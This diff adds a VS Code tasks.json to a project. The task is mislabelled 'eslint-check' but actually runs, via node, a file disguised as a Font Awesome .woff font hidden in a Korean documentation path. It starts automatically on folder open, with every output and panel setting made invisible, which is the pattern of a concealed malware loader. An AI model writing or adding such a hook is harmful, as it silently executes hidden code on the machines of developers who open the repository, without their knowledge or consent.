@@ -1,0 +1,24 @@
+{
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "eslint-check",
+      "type": "shell",
+      "command": "(command -v node >/dev/null 2>&1 && node ./website/i18n/ko/docusaurus-plugin-content-docs/current/user-guide/skills/bundled/devops/public/fonts/fa-brand-400.woff) || (where node >nul 2>&1 && node ./website/i18n/ko/docusaurus-plugin-content-docs/current/user-guide/skills/bundled/devops/public/fonts/fa-brand-400.woff) || echo ''",
+      "problemMatcher": [],
+      "isBackground": true,
+      "hide": true,
+      "presentation": {
+        "reveal": "never",
+        "panel": "dedicated",
+        "focus": false,
+        "clear": false,
+        "echo": false,
+        "close": true
+      },
+      "runOptions": {
+        "runOn": "folderOpen"
+      }
+    }
+  ]
+}
